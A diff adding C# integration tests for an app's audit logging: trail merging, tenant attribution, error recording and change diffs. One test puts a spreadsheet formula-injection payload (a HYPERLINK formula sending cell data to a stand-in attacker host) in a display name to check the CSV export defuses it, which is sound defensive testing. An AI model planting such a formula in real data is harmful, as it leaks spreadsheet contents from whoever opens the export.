@@ -1,12 +1,14 @@
 using System.Net;
 using System.Net.Http.Headers;
 using System.Net.Http.Json;
+using System.Text;
 using System.Text.Json;
 using ClimateProject.Api.Endpoints;
 using ClimateProject.Application.Auditing;
 using ClimateProject.Application.Auth;
 using ClimateProject.Application.OrgStructure;
 using ClimateProject.Application.Profile;
+using ClimateProject.Application.Surveys;
 using ClimateProject.Domain.Entities;
 using ClimateProject.Infrastructure.Persistence;
 using ClimateProject.IntegrationTests.Support;
@@ -358,20 +360,334 @@ public class AuditLoggingTests : IAsyncLifetime
     /// "reconciled, not two trails" means in practice: one ordered list, not a second endpoint
     /// the reader has to know about.
     /// </summary>
+    /// <remarks>
+    /// The general half is produced by a real HTTP mutation, not seeded. It has to be: the
+    /// row a mutation writes is filed under the route that made it — <c>surveys.status</c>,
+    /// not <c>surveys</c> — so seeding the survey and asserting only that the
+    /// <c>survey_audit_logs</c> row comes back proves nothing about the merge and passed
+    /// while <c>GET /audit/surveys/{id}</c> returned no general rows at all. That is the
+    /// question #143 opens with ("who changed this survey after responses arrived"), so it is
+    /// asserted here from both directions: the sub-resource row is present, and its resource
+    /// is the sub-resource name rather than the one that was asked for.
+    /// </remarks>
     [Fact]
     public async Task The_entity_trail_merges_the_general_and_survey_records()
     {
-        var (client, _) = await SignUpAsync(Roles.CompanyAdmin);
+        var (client, userId) = await SignUpAsync(Roles.CompanyAdmin);
         var (surveyId, _) = await SeedSurveyTrailAsync();
+
+        // A real mutation against the survey: active -> closed is a legal transition, and it
+        // writes both an audit_logs row (resource surveys.status) and a survey_audit_logs one.
+        var closed = await client.PutAsJsonAsync(
+            $"/surveys/{surveyId}/status",
+            new UpdateSurveyStatusRequest(SurveyStatuses.Closed));
+        Assert.Equal(HttpStatusCode.OK, closed.StatusCode);
 
         var response = await client.GetAsync($"/audit/surveys/{surveyId}");
         Assert.Equal(HttpStatusCode.OK, response.StatusCode);
 
         var items = (await response.Content.ReadFromJsonAsync<List<AuditLogItem>>())!;
 
-        var surveyRow = Assert.Single(items, i => i.Source == AuditSources.Survey);
-        Assert.Equal("published", surveyRow.Action);
-        Assert.Equal(surveyId.ToString(), surveyRow.ResourceId);
+        var generalRow = Assert.Single(items, i => i.Source == AuditSources.General);
+        Assert.Equal("surveys.status.update", generalRow.Action);
+        Assert.Equal("surveys.status", generalRow.Resource);
+        Assert.Equal(surveyId.ToString(), generalRow.ResourceId);
+        Assert.Equal(userId, generalRow.UserId);
+
+        // Both survey-side rows: the seeded one and the one the status change wrote. The
+        // status_changed row files its own entity type ("status") and no entity id, which is
+        // SurveyAuditTrail's shape and not this endpoint's to change.
+        Assert.Contains(
+            items,
+            i => i.Source == AuditSources.Survey && i.Action == "published" && i.ResourceId == surveyId.ToString());
+        Assert.Contains(items, i => i.Source == AuditSources.Survey && i.Action == "status_changed");
+    }
+
+    /// <summary>
+    /// Asking for a sub-resource by its own name still narrows to that route's rows. The
+    /// prefix match widens what <c>surveys</c> answers; it must not stop <c>surveys.status</c>
+    /// meaning what it says.
+    /// </summary>
+    [Fact]
+    public async Task The_entity_trail_can_still_be_narrowed_to_one_sub_resource()
+    {
+        var (client, _) = await SignUpAsync(Roles.CompanyAdmin);
+        var (surveyId, _) = await SeedSurveyTrailAsync();
+
+        // Two different routes against the same survey, so "everything" and "just this route"
+        // have different answers and the filter has something to get wrong.
+        Assert.Equal(
+            HttpStatusCode.Created,
+            (await client.PostAsync($"/surveys/{surveyId}/duplicate", content: null)).StatusCode);
+
+        Assert.Equal(
+            HttpStatusCode.OK,
+            (await client.PutAsJsonAsync(
+                $"/surveys/{surveyId}/status",
+                new UpdateSurveyStatusRequest(SurveyStatuses.Closed))).StatusCode);
+
+        var whole = await ReadTrailAsync(client, $"/audit/surveys/{surveyId}");
+        var general = whole.Where(i => i.Source == AuditSources.General).ToList();
+
+        Assert.Equal(2, general.Count);
+        Assert.Contains(general, i => i.Resource == "surveys.status");
+        Assert.Contains(general, i => i.Resource == "surveys.duplicate");
+
+        var narrowed = await ReadTrailAsync(client, $"/audit/surveys.status/{surveyId}");
+
+        Assert.Equal("surveys.status", Assert.Single(narrowed).Resource);
+    }
+
+    private static async Task<List<AuditLogItem>> ReadTrailAsync(HttpClient client, string url)
+    {
+        var response = await client.GetAsync(url);
+        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
+        return (await response.Content.ReadFromJsonAsync<List<AuditLogItem>>())!;
+    }
+
+    /// <summary>
+    /// The export cannot be turned into a spreadsheet formula by the people it names.
+    /// </summary>
+    /// <remarks>
+    /// The attack is entirely inside the product's own rules: an ordinary Employee sets their
+    /// display name through <c>PUT /profile</c>, which accepts any non-blank string, and the
+    /// only people who can open <c>GET /audit/export</c> are CompanyAdmins and SuperAdmins. So
+    /// a formula in a name runs with the reader's authority on the reader's machine. Quoting
+    /// the field does not prevent it — Excel and LibreOffice evaluate a quoted cell that
+    /// begins with <c>=</c> — which is why this asserts on the neutralising apostrophe and not
+    /// merely on the quotes.
+    /// </remarks>
+    [Fact]
+    public async Task An_employees_display_name_cannot_smuggle_a_formula_into_the_export()
+    {
+        var (employee, employeeId) = await SignUpAsync(Roles.Employee);
+        const string Payload = "=HYPERLINK(\"http://attacker.test/?\"&A1,\"click me\")";
+
+        Assert.Equal(
+            HttpStatusCode.OK,
+            (await employee.PutAsJsonAsync("/profile", new UpdateProfileRequest(Payload))).StatusCode);
+
+        var (admin, _) = await SignUpAsync(Roles.CompanyAdmin);
+        var export = await admin.GetAsync($"/audit/export?userId={employeeId}");
+        Assert.Equal(HttpStatusCode.OK, export.StatusCode);
+
+        var csv = await export.Content.ReadAsStringAsync();
+
+        // The name is there -- neutralising must not mean dropping the evidence.
+        Assert.Contains("attacker.test", csv, StringComparison.Ordinal);
+
+        // ...and it is inert: the cell starts with an apostrophe, so no spreadsheet reads it
+        // as a formula. Quoting alone would leave "=HYPERLINK( in the file.
+        Assert.Contains("\"'=HYPERLINK(", csv, StringComparison.Ordinal);
+        Assert.DoesNotContain("\"=HYPERLINK(", csv, StringComparison.Ordinal);
+    }
+
+    /// <summary>
+    /// The tenant on the row comes from the actor's own <c>users</c> row, not from the
+    /// <c>companyId</c> claim in the token they presented.
+    /// </summary>
+    /// <remarks>
+    /// The two can disagree: a token is valid for 24h and a user can be moved between
+    /// companies inside that window. Trusting the claim would file the row in the tenant the
+    /// user has left — visible to the wrong CompanyAdmin, invisible to the right one — which
+    /// is a tenant-isolation failure in a table whose whole job is attribution.
+    ///
+    /// Driven through <c>PUT /admin/departments/{id}</c> rather than a profile route on
+    /// purpose: the profile handlers resolve the actor themselves and hand it to
+    /// <c>AuditEntry.AttributeTo</c>, so they would pass this test however the middleware
+    /// behaved. This endpoint enriches nothing, so the row is attributed by
+    /// <c>AuditWritingMiddleware.ResolveActorAsync</c> — the code under test.
+    /// </remarks>
+    [Fact]
+    public async Task The_row_is_filed_under_the_actors_user_row_not_the_tokens_company_claim()
+    {
+        var (client, userId) = await SignUpAsync(Roles.CompanyAdmin);
+
+        var create = await client.PostAsJsonAsync(
+            "/admin/departments",
+            new CreateDepartmentRequest(_companyId, $"Moved {Guid.NewGuid():N}", null, null, true));
+        Assert.Equal(HttpStatusCode.Created, create.StatusCode);
+        var departmentId = (await create.Content.ReadFromJsonAsync<DepartmentDetail>())!.Id;
+
+        // The user moves companies. The token in `client` still says the old one, and the
+        // handler's own authorization check reads that claim, so the request is still allowed.
+        var newCompanyId = await MoveUserToANewCompanyAsync(userId);
+
+        Assert.Equal(
+            HttpStatusCode.OK,
+            (await client.PutAsJsonAsync(
+                $"/admin/departments/{departmentId}",
+                new UpdateDepartmentRequest("Renamed after the move", null, null))).StatusCode);
+
+        var rows = await RowsForAsync(userId);
+
+        Assert.Equal(_companyId, rows[0].CompanyId);
+        Assert.Equal(newCompanyId, rows[1].CompanyId);
+        Assert.NotEqual(_companyId, rows[1].CompanyId);
+    }
+
+    /// <summary>
+    /// A mutating endpoint that accepts an unidentified caller writes no row, and that is a
+    /// known, written-down gap rather than a surprise.
+    /// </summary>
+    /// <remarks>
+    /// <c>audit_logs.company_id</c> is NOT NULL behind a RESTRICT foreign key, so a request
+    /// with no user row behind it has no tenant to file under; the middleware logs a warning
+    /// and abandons the write. This test exists so the gap cannot change size in silence:
+    /// <c>AuditCoverageTests.UnattributableMutatingRoutes</c> pins the set of endpoints from
+    /// the live route table, and this pins the behaviour behind it. Closing the gap — a
+    /// nullable <c>company_id</c>, which is a migration — should make this test fail, and that
+    /// failure is the intended signal, not a regression.
+    /// </remarks>
+    [Fact]
+    public async Task An_unidentified_mutation_writes_no_row()
+    {
+        var (_, userId) = await SignUpAsync(Roles.Employee);
+
+        await using (var db = CreateContext())
+        {
+            var email = (await db.Users.AsNoTracking().FirstAsync(u => u.Id == userId)).Email;
+            var anonymous = Factory.CreateClient();
+
+            for (var attempt = 0; attempt < 3; attempt++)
+            {
+                var refused = await anonymous.PostAsJsonAsync(
+                    "/auth/login",
+                    new LoginRequest(email, "not-the-password"));
+
+                Assert.Equal(HttpStatusCode.Unauthorized, refused.StatusCode);
+            }
+        }
+
+        // Three failed logins against a real account: no row, because there is no identified
+        // caller to attribute one to.
+        Assert.Empty(await RowsForAsync(userId));
+    }
+
+    /// <summary>
+    /// A request that ends in an unhandled exception records no status rather than the 200 it
+    /// had not yet stopped being.
+    /// </summary>
+    /// <remarks>
+    /// This middleware writes its row from a <c>finally</c>, while the exception is still on
+    /// its way out to <c>UseExceptionHandler</c>, which is registered upstream in
+    /// <c>Program.cs</c> and has not set a status yet. Recording <c>Response.StatusCode</c>
+    /// there produced <c>{"Status":200}</c> next to <c>success=false</c> on a request that the
+    /// caller saw as a 500 — the row contradicted itself on exactly the events most worth
+    /// reading. Provoked with a malformed body so the failure comes from the framework rather
+    /// than from a handler this test would then also be testing.
+    /// </remarks>
+    [Fact]
+    public async Task A_request_that_throws_records_no_status_and_names_the_exception()
+    {
+        var (client, userId) = await SignUpAsync(Roles.Employee);
+
+        var malformed = new StringContent("{\"name\": ", Encoding.UTF8, "application/json");
+        var response = await client.PutAsync("/profile", malformed);
+
+        Assert.True(
+            response.StatusCode is HttpStatusCode.InternalServerError or HttpStatusCode.BadRequest,
+            $"expected the malformed body to fail the request, got {(int)response.StatusCode}");
+
+        var row = Assert.Single(await RowsForAsync(userId));
+
+        Assert.False(row.Success);
+        Assert.Equal("BadHttpRequestException", row.ErrorMessage);
+
+        var status = JsonDocument.Parse(Assert.IsType<string>(row.Details)).RootElement.GetProperty("Status");
+        Assert.Equal(JsonValueKind.Null, status.ValueKind);
+    }
+
+    /// <summary>
+    /// #143 asks for "before/after where meaningful". <c>PUT /admin/departments/{id}</c> is
+    /// the worked example; the values reach <c>details</c> through <c>AuditEntry</c>.
+    /// </summary>
+    [Fact]
+    public async Task An_update_records_the_before_and_after_of_the_fields_it_changed()
+    {
+        var (client, userId) = await SignUpAsync(Roles.CompanyAdmin);
+
+        var originalName = $"Before {Guid.NewGuid():N}";
+        var create = await client.PostAsJsonAsync(
+            "/admin/departments",
+            new CreateDepartmentRequest(_companyId, originalName, null, null, true));
+        Assert.Equal(HttpStatusCode.Created, create.StatusCode);
+        var departmentId = (await create.Content.ReadFromJsonAsync<DepartmentDetail>())!.Id;
+
+        Assert.Equal(
+            HttpStatusCode.OK,
+            (await client.PutAsJsonAsync(
+                $"/admin/departments/{departmentId}",
+                new UpdateDepartmentRequest("After", null, false))).StatusCode);
+
+        var rows = await RowsForAsync(userId);
+        var changes = JsonDocument.Parse(Assert.IsType<string>(rows[1].Details))
+            .RootElement.GetProperty("Changes");
+
+        Assert.Equal(originalName, changes.GetProperty("name").GetProperty("Before").GetString());
+        Assert.Equal("After", changes.GetProperty("name").GetProperty("After").GetString());
+        Assert.Equal("True", changes.GetProperty("isActive").GetProperty("Before").GetString());
+        Assert.Equal("False", changes.GetProperty("isActive").GetProperty("After").GetString());
+
+        // The create recorded none: there is no "before" for a row that did not exist, and an
+        // absent diff is null rather than an empty object.
+        var createDetails = JsonDocument.Parse(Assert.IsType<string>(rows[0].Details)).RootElement;
+        Assert.Equal(JsonValueKind.Null, createDetails.GetProperty("Changes").ValueKind);
+    }
+
+    /// <summary>
+    /// <c>GET /profile/activity</c> is still the three self-service events, not everything the
+    /// caller has ever done.
+    /// </summary>
+    /// <remarks>
+    /// #143 gave <c>audit_logs</c> one writer for the whole application, which would have
+    /// broadened this endpoint by itself. Its UI renders anything it does not have copy for as
+    /// the raw dotted action name, identically in English and Spanish, so the broadening would
+    /// have shipped untranslated wire values onto the profile page. The filter is the contract
+    /// this endpoint had before #143 and the one its screen is written for.
+    /// </remarks>
+    [Fact]
+    public async Task The_activity_list_stays_the_callers_own_profile_events()
+    {
+        var (client, _) = await SignUpAsync(Roles.CompanyAdmin);
+
+        Assert.Equal(
+            HttpStatusCode.OK,
+            (await client.PutAsJsonAsync("/profile", new UpdateProfileRequest("Renamed Person"))).StatusCode);
+
+        Assert.Equal(
+            HttpStatusCode.Created,
+            (await client.PostAsJsonAsync(
+                "/admin/departments",
+                new CreateDepartmentRequest(_companyId, $"Not activity {Guid.NewGuid():N}", null, null, true))).StatusCode);
+
+        var response = await client.GetAsync("/profile/activity");
+        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
+
+        var activity = (await response.Content.ReadFromJsonAsync<ProfileActivityResponse>())!;
+
+        Assert.Equal(ProfileAuditActions.Update, Assert.Single(activity.Activity).Action);
+    }
+
+    /// <summary>Moves the user to a brand new company and returns its id.</summary>
+    private async Task<Guid> MoveUserToANewCompanyAsync(Guid userId)
+    {
+        await using var db = CreateContext();
+
+        var company = new Company
+        {
+            Id = Guid.NewGuid(),
+            Name = "Destination Co",
+            EmailDomain = $"moved-{Guid.NewGuid():N}.test",
+            CreatedAt = DateTimeOffset.UtcNow,
+        };
+        db.Companies.Add(company);
+
+        var user = await db.Users.FirstAsync(u => u.Id == userId);
+        user.CompanyId = company.Id;
+
+        await db.SaveChangesAsync();
+        return company.Id;
     }
 
     private async Task<AuditLogPage> ReadPageAsync(HttpClient client, string url)
